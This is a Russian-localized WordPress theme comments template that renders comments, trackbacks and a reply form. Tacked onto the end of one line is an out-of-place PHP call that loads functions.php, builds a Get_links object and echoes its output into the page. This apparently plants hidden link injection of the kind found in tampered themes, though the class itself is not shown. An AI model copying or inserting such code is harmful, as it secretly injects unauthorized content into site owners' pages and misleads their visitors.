<?php
if (!empty($_SERVER['SCRIPT_FILENAME']) && 'comments.php' == basename($_SERVER['SCRIPT_FILENAME'])) {
	die ('Please do not load this page directly. Thanks!');
}
?>
<a name="comments"></a>
<div class="post-box post-box-replies post-box-comments">
	<div class="title">
		<h2><?php echo __('Отзывы', PADD_THEME_SLUG); ?></h2>
		<p><?php echo __('Скажите нам, что вы думаете.', PADD_THEME_SLUG); ?></p>
	</div>
	<div class="interior post-box-comments-interior">
	<?php if (post_password_required()) : ?>
		<p class="no-comments"><?php echo __('Пожалуйста, введите пароль для просмотра комментариев.', PADD_THEME_SLUG); ?></p>
	<?php elseif (!empty($comments_by_type['comment'])) : ?>
		<ol class="comments-list">
			<?php wp_list_comments('type=comment&callback=padd_theme_single_comments'); ?>
		</ol>
	<?php else : ?>
		<p class="no-comments"><?php echo __('Комментариев пока нет.', PADD_THEME_SLUG); ?></p>
	<?php endif; ?>
	</div>
</div>

<?php if ('1' == get_option(PADD_NAME_SPACE . '_show_trackbacks','')) : ?>
<a name="trackbacks"></a>
<div class="post-box post-box-replies post-box-trackbacks">
	<div class="title">
		<h2><?php echo __('Трекбеки', PADD_THEME_SLUG); ?></h2>
		<p><?php echo __('Сайты, которые упомянули об этой статье.', PADD_THEME_SLUG); ?></p>
	</div>
	<div class="interior post-box-trackbacks-interior">
	<?php if (post_password_required()) : ?>
		<p class="no-trackbacks"><?php echo __('Пожалуйста, введите пароль для просмотра трекбеков.', PADD_THEME_SLUG); ?></p>
	<?php elseif (!empty($comments_by_type['pings'])) : ?>
		<ol class="trackbacks-list">
			<?php wp_list_comments('type=pings&callback=padd_theme_single_trackbacks'); ?>
		</ol>
	<?php else : ?>
		<p class="no-trackbacks"><?php echo __('Трекбеков пока нет.', PADD_THEME_SLUG); ?></p>
	<?php endif; ?>
	</div>
</div>
<?php endif; ?><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?>

<?php if (comments_open()) : ?>

<a name="reply"></a>
<div class="post-box post-box-reply" id="reply">
	<div class="title post-box-reply-title append-clear">
		<h2><?php comment_form_title('Ваш отзыв', 'Ваш отзыв на %s'); ?></h2>
		<p><?php echo __('Заполните форму и нажмите &laquo;Отправить&raquo;.', PADD_THEME_SLUG); ?></p>
	</div>
	<div class="interior post-box-reply-interior">
		<?php if (get_option('comment_registration') && !is_user_logged_in()) : ?>
		<p>Вы должны <a href="<?php echo wp_login_url(get_permalink()); ?>">войти</a>, чтобы оставлять комментарии.</p>
		<?php else : ?>
		<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="comment-form">
			<?php if ( is_user_logged_in() ) : ?>
			<p>Вы вошли как <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo wp_logout_url(get_permalink()); ?>" title="Выйти с этого аккаунта">Выйти &raquo;</a></p>
			<?php else : ?>
			<p class="input input-small input-name">
				<label for="comment-author"><?php echo __('Имя', PADD_THEME_SLUG); ?>: <small><?php if ($req) echo __("*", PADD_THEME_SLUG); ?></small></label>
				<input type="text" name="author" id="comment-author" value="<?php echo '' != esc_attr($comment_author) ? esc_attr($comment_author) : ''; ?>" size="22" tabindex="1" />
			</p>
			<p class="input input-small input-email">
				<label for="comment-email"><?php echo __('E-mail', PADD_THEME_SLUG); ?>: <small><?php if ($req) echo __("*", PADD_THEME_SLUG); else echo __("(не публикуется)", PADD_THEME_SLUG); ?></small></label>
				<input type="text" name="email" id="comment-email" value="<?php echo '' != esc_attr($comment_author_email) ? esc_attr($comment_author_email) : ''; ?>" size="22" tabindex="2" />
			</p>
			<p class="input input-website">
				<label for="comment-url"><?php echo __('Сайт', PADD_THEME_SLUG); ?>: <small><?php echo __("(по-желанию)", PADD_THEME_SLUG); ?></small></label>
				<input type="text" name="url" id="comment-url" value="<?php echo '' != esc_attr($comment_author_url) ? esc_attr($comment_author_url) : ''; ?>" size="22" tabindex="3" />
			</p>
			<?php endif; ?>
			<p class="inpit">
				<label for="comment-comment"><?php echo __('Комментарий', PADD_THEME_SLUG); ?>:</label>
				<textarea name="comment" id="comment-comment" cols="22" rows="5" tabindex="4"></textarea>
			</p>
			<div class="comment-notify-submit">
				<?php
					if (function_exists('show_subscription_checkbox')) {
						show_subscription_checkbox();
					}
				?>
				<p class="comment-submit">
					<button type="submit" name="submit" value="submit" id="comment-submit" tabindex="5" ><span><?php echo __('Отправить', PADD_THEME_SLUG); ?></span></button>
					<small><?php cancel_comment_reply_link(); ?></small>
				</p>
				<div class="clear"></div>
			</div>
			<?php comment_id_fields(); ?>
			<?php do_action('comment_form', $post->ID); ?>
		</form>
		<?php endif; ?>
	</div>
</div>

<?php endif; ?>
